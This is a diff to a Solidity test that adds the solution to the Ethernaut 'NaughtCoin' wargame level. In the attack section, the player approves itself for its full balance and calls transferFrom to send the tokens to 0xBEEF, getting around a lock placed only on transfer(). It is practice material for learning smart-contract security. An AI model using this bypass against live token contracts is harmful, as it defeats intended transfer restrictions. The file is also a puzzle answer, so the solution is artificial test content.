@@ -29,6 +29,11 @@ contract NaughtCoinTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        address beef = address(0xBEEF);
+        uint256 balanceOfPlayer = ethernautNaughtCoin.balanceOf(msg.sender);
+        ethernautNaughtCoin.approve(ethernautNaughtCoin.player(), balanceOfPlayer);
+        ethernautNaughtCoin.transferFrom(ethernautNaughtCoin.player(), beef, ethernautNaughtCoin.balanceOf(msg.sender));
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
